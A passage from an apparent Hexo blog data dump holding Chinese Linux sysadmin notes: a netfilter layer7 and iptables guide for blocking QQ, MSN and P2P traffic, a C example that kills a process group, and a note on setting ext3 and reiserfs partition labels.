/><br><strong>准备</strong><br>1.内核源码&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;<br>2.iptables 源码&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;<br>3.netfilter-L7 filter<br>4.l7-protocols<br><strong>安装</strong><br>1.给内核打补丁.编译内核。我使用的2.6.28的内核。<br>patch -pl &lt; &#x2F;root&#x2F;netfilter-layer7-v2.22&#x2F;kernel-2.6.25-2.6.28-layer7-2.22.patch<br>编译内核<br>make menuconfig<br>选项<br>General setup&amp;nbsp; —&amp;nbsp; <br />&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; Prompt for development and&#x2F;or incomplete code&#x2F;drivers&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;<br />&amp;nbsp;&amp;nbsp; Networking&amp;nbsp; —&amp;nbsp; <br />&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; Networking options&amp;nbsp; —&amp;nbsp; <br />&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; Network packet filtering framework (Netfilter)&amp;nbsp; —&amp;nbsp; <br />&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; Core Netfilter Configuration&amp;nbsp; —&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;<br />&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;M&gt; Netfilter connection tracking support&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; <br />&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;M&gt;&amp;nbsp;&amp;nbsp; &quot;layer7&quot; match support&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; <br />&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; Layer 7 debugging output&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;<br />&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; IP: Netfilter Configuration&amp;nbsp; —&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;<br>&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;M&gt;FULL NAT &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;nbsp; #别忘记这个不然没有nat table<br>make<br>make moduls_install&amp;nbsp;<br>make install<br>2.安装Layer 7协议<br>cd l7-protocols-2009-05-28&#x2F; <br />make install<br>3.编译iptables<br>.&#x2F;configure –with-ksoure&#x3D;&#x2F;usr&#x2F;src&#x2F;linux-2.6.28&#x2F;<br>make<br>make install<br>4.检测。重启选择启动那个内核。<br>iptables -V&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; #你的iptables 版本<br>iptables -m layer7 –help&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp; #看看有layer7选项吗<br>lsmod|grep layer7&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; #看看有相应的模块吗<br>iptables -t nat -L&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; #其他tables能不能用。<br>iptables -t mangle -L<br>iptables -L<br>5.测试<br>iptables -t nat -A POSTROUTING -s 内网ip -j SNAT –to 外防火墙IP&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; #客户端能正常上网，上QQ<br>iptables -t mangle -I PREROUTING -m layer –l7proto qq -j DROP&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; #退下QQ，看看能不能使用。<br>6.相应语法<br>iptables -t mangle -I PREROUTING -m layer7 –l7proto edonkey -j DROP <br />iptables -t mangle -I PREROUTING -m layer7 –l7proto bittorrent -j DROP <br />iptables -t mangle -I PREROUTING -m layer7 –l7proto qq -j DROP <br />iptables -t mangle -I PREROUTING -m layer7 –l7proto msnmessenger -j DROP <br />iptables -t mangle -I PREROUTING -m layer7 –l7proto xunlei -j DROP <br />iptables -t mangle -I PREROUTING -m layer7 –l7proto kugoo -j DROP <br />iptables -t mangle -I PREROUTING -m layer7 –l7proto yahoo -j DROP<br>&amp;nbsp;<br>参考地址：<br><a href=\"http://lzy821218.blog.51cto.com/209800/307349\">http://lzy821218.blog.51cto.com/209800/307349</a></p>\n","site":{"data":{}},"excerpt":"","more":"<p>iptables之7层过滤封QQ、MSN、P2P<br>环境vmware-NAT连接上网。<br><br />&amp;nbsp;&amp;nbsp; 192.168.2.0&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 192.168.20.0<br />clent —–&gt;eth0-[linux]-eth1——-[nat]—-intener<br>&amp;nbsp;<br>by：key1088<br /><br><strong>准备</strong><br>1.内核源码&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;<br>2.iptables 源码&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;<br>3.netfilter-L7 filter<br>4.l7-protocols<br><strong>安装</strong><br>1.给内核打补丁.编译内核。我使用的2.6.28的内核。<br>patch -pl &lt; &#x2F;root&#x2F;netfilter-layer7-v2.22&#x2F;kernel-2.6.25-2.6.28-layer7-2.22.patch<br>编译内核<br>make menuconfig<br>选项<br>General setup&amp;nbsp; —&amp;nbsp; <br />&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; Prompt for development and&#x2F;or incomplete code&#x2F;drivers&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;<br />&amp;nbsp;&amp;nbsp; Networking&amp;nbsp; —&amp;nbsp; <br />&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; Networking options&amp;nbsp; —&amp;nbsp; <br />&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; Network packet filtering framework (Netfilter)&amp;nbsp; —&amp;nbsp; <br />&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; Core Netfilter Configuration&amp;nbsp; —&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;<br />&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;M&gt; Netfilter connection tracking support&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; <br />&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;M&gt;&amp;nbsp;&amp;nbsp; &quot;layer7&quot; match support&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; <br />&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; Layer 7 debugging output&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;<br />&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; IP: Netfilter Configuration&amp;nbsp; —&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;<br>&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;M&gt;FULL NAT &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;nbsp; #别忘记这个不然没有nat table<br>make<br>make moduls_install&amp;nbsp;<br>make install<br>2.安装Layer 7协议<br>cd l7-protocols-2009-05-28&#x2F; <br />make install<br>3.编译iptables<br>.&#x2F;configure –with-ksoure&#x3D;&#x2F;usr&#x2F;src&#x2F;linux-2.6.28&#x2F;<br>make<br>make install<br>4.检测。重启选择启动那个内核。<br>iptables -V&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; #你的iptables 版本<br>iptables -m layer7 –help&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp; #看看有layer7选项吗<br>lsmod|grep layer7&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; #看看有相应的模块吗<br>iptables -t nat -L&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; #其他tables能不能用。<br>iptables -t mangle -L<br>iptables -L<br>5.测试<br>iptables -t nat -A POSTROUTING -s 内网ip -j SNAT –to 外防火墙IP&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; #客户端能正常上网，上QQ<br>iptables -t mangle -I PREROUTING -m layer –l7proto qq -j DROP&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; #退下QQ，看看能不能使用。<br>6.相应语法<br>iptables -t mangle -I PREROUTING -m layer7 –l7proto edonkey -j DROP <br />iptables -t mangle -I PREROUTING -m layer7 –l7proto bittorrent -j DROP <br />iptables -t mangle -I PREROUTING -m layer7 –l7proto qq -j DROP <br />iptables -t mangle -I PREROUTING -m layer7 –l7proto msnmessenger -j DROP <br />iptables -t mangle -I PREROUTING -m layer7 –l7proto xunlei -j DROP <br />iptables -t mangle -I PREROUTING -m layer7 –l7proto kugoo -j DROP <br />iptables -t mangle -I PREROUTING -m layer7 –l7proto yahoo -j DROP<br>&amp;nbsp;<br>参考地址：<br><a href=\"http://lzy821218.blog.51cto.com/209800/307349\">http://lzy821218.blog.51cto.com/209800/307349</a></p>\n"},{"title":"kill进程组所有进程","date":"2013-06-05T14:33:15.000Z","_content":"<pre>\n#include <stdio.h>\n#include <sys/signal.h>\n#include <stdlib.h>\nint main(void)\n{\n    pid_t   pid;\n    printf(\"father-pgrpid=[%d]n\", getpgrp());\n    pid = fork();\n    if (pid < 0) {\n        printf(\"fork errn\");\n    } else if (pid == 0) {\n        setpgrp();\n        printf(\"child-pid[%d]n\", getpid());\n        printf(\"child-pgrpid=[%d]n\", getpgrp());\n        if(pid=fork() <0) {\n            printf(\"fork errn\");\n        }else if (pid == 0) {\n            while(1)\n                sleep(10);\n            exit(0);\n        }\n        sleep(100);\n        exit(1);\n    }else{\n        sleep(1);\n        printf(\"fathern\");\n        if(kill(-pid, SIGTERM) != 0) {\n            perror(\"kill\");\n        }else{\n            printf(\"killed okn\");\n        }\n    }\n}\n</pre>","source":"_posts/kill进程组所有进程.md","raw":"title: kill进程组所有进程\ncategories: [Linux,C编程]\ntags: []\ndate: 2013-06-05 22:33:15\n---\n<pre>\n#include <stdio.h>\n#include <sys/signal.h>\n#include <stdlib.h>\nint main(void)\n{\n    pid_t   pid;\n    printf(\"father-pgrpid=[%d]n\", getpgrp());\n    pid = fork();\n    if (pid < 0) {\n        printf(\"fork errn\");\n    } else if (pid == 0) {\n        setpgrp();\n        printf(\"child-pid[%d]n\", getpid());\n        printf(\"child-pgrpid=[%d]n\", getpgrp());\n        if(pid=fork() <0) {\n            printf(\"fork errn\");\n        }else if (pid == 0) {\n            while(1)\n                sleep(10);\n            exit(0);\n        }\n        sleep(100);\n        exit(1);\n    }else{\n        sleep(1);\n        printf(\"fathern\");\n        if(kill(-pid, SIGTERM) != 0) {\n            perror(\"kill\");\n        }else{\n            printf(\"killed okn\");\n        }\n    }\n}\n</pre>","slug":"kill进程组所有进程","published":1,"updated":"2023-04-22T05:38:44.775Z","_id":"clgrjlxdu002h7opicean2yhs","comments":1,"layout":"post","photos":[],"link":"","content":"<pre>\n#include <stdio.h>\n#include <sys/signal.h>\n#include <stdlib.h>\nint main(void)\n{\n    pid_t   pid;\n    printf(\"father-pgrpid=[%d]n\", getpgrp());\n    pid = fork();\n    if (pid < 0) {\n        printf(\"fork errn\");\n    } else if (pid == 0) {\n        setpgrp();\n        printf(\"child-pid[%d]n\", getpid());\n        printf(\"child-pgrpid=[%d]n\", getpgrp());\n        if(pid=fork() <0) {\n            printf(\"fork errn\");\n        }else if (pid == 0) {\n            while(1)\n                sleep(10);\n            exit(0);\n        }\n        sleep(100);\n        exit(1);\n    }else{\n        sleep(1);\n        printf(\"fathern\");\n        if(kill(-pid, SIGTERM) != 0) {\n            perror(\"kill\");\n        }else{\n            printf(\"killed okn\");\n        }\n    }\n}\n</pre>","site":{"data":{}},"excerpt":"","more":"<pre>\n#include <stdio.h>\n#include <sys/signal.h>\n#include <stdlib.h>\nint main(void)\n{\n    pid_t   pid;\n    printf(\"father-pgrpid=[%d]n\", getpgrp());\n    pid = fork();\n    if (pid < 0) {\n        printf(\"fork errn\");\n    } else if (pid == 0) {\n        setpgrp();\n        printf(\"child-pid[%d]n\", getpid());\n        printf(\"child-pgrpid=[%d]n\", getpgrp());\n        if(pid=fork() <0) {\n            printf(\"fork errn\");\n        }else if (pid == 0) {\n            while(1)\n                sleep(10);\n            exit(0);\n        }\n        sleep(100);\n        exit(1);\n    }else{\n        sleep(1);\n        printf(\"fathern\");\n        if(kill(-pid, SIGTERM) != 0) {\n            perror(\"kill\");\n        }else{\n            printf(\"killed okn\");\n        }\n    }\n}\n</pre>"},{"title":"LABEL 问题","date":"2010-12-02T09:10:00.000Z","_content":"<p>e2label device [newlabel]&nbsp;&nbsp;  创建设备的标签命令 <br />比如我们想把文件系统为ext3 的分区/dev/hda5的标签设备为 /5 ，我们应该执行如下的命令： <br />[root@localhost]# e2label /dev/hda5 /5 <br /><br />如果是reiserfs文件系统，我们应该用 <br />[root@localhost]# reiserfstune -l 标签 设备 <br />举例：比如我为reiserfs 文件系统 /dev/hda10设置标签为 /10 ； <br />[root@localhost]# reiserfstune -l /10 /dev/hda10 <br /><br />警告： 请不要在您的Linux的安装分区（也就是Linux系统/ 所在的分区）实践，会导致您的Linux系统崩溃；如果想实践，请在其它分区测试。</p><p> </p><p>破坏的话，用光盘进入查看LABEL，或修复，进入grub修改也可以。</p>","source":"_posts/LABEL-问题.md","raw":"title: LABEL 问题\ncategories: [Linux]\ntags: []\ndate: 2010-12-02 17:10:00\n---\n<p>e2label device [newlabel]&nbsp;&nbsp;  创建设备的标签命令 <br />比如我们想把文件系统为ext3 的分区/dev/hda5的标签设备为 /5 ，我们应该执行如下的命令： <br />[root@localhost]# e2label /dev/hda5 /5 <br /><br />如果是reiserfs文件系统，我们应该用 <br />[root@localhost]# reiserfstune -l 标签 设备 <br />举例：比如我为reiserfs 文件系统 /dev/hda10设置标签为 /10 ； <br />[root@localhost]# reiserfstune -l /10 /dev/hda10 <br /><br />警告： 请不要在您的Linux的安装分区（也就是Linux系统/ 所在的分区）实践，会导致您的Linux系统崩溃；如果想实践，请在其它分区测试。</p><p> </p><p>破坏的话，用光盘进入查看LABEL，或修复，进入grub修改也可以。</p>","slug":"LABEL-问题","published":1,"updated":"2023-04-22T05:38:44.643Z","_id":"clgrjlxdw002j7opic4ic877e","comments":1,"layout":"post","photos":[],"link":"","content":"<p>e2label device [newlabel]&nbsp;&nbsp;  创建设备的标签命令 <br />比如我们想把文件系统为ext3 的分区/dev/hda5的标签设备为 /5 ，我们应该执行如下的命令： <br />[root@localhost]# e2label /dev/hda5 /5 <br /><br />如果是reiserfs文件系统，我们应该用 <br />[root@localhost]# reiserfstune -l 标签 设备 <br />举例：比如我为reiserfs 文件系统 /dev/hda10设置标签为 /10 ； <br />[root@localhost]# reiserfstune -l /10 /dev/hda10 <br /><br />警告： 请不要在您的Linux的安装分区（也就是Linux系统/ 所在的分区）实践，会导致您的Linux系统崩溃；如果想实践，请在其它分区测试。</p><p> </p><p>破坏的话，用光盘进入查看LABEL，或修复，进入grub修改也可以。</p>","site":{"data":{}},"excerpt":"","more":"<p>e2label device [newlabel]&nbsp;&nbsp;  创建设备的标签命令 <br />比如我们想把文件系统为ext3 的分区/dev/hda5的标签设备为 /5 ，我们应该执行如下的命令： <br />[root@localhost]# e2label /dev/hda5 /5 <br /><br />如果是reiserfs文件系统，我们应该用 <br />[root@localhost]# reiserfstune -l 标签 设备 <br />举例：比如我为reiserfs 文件系统 /dev/hda10设置标签为 /10 ； <br 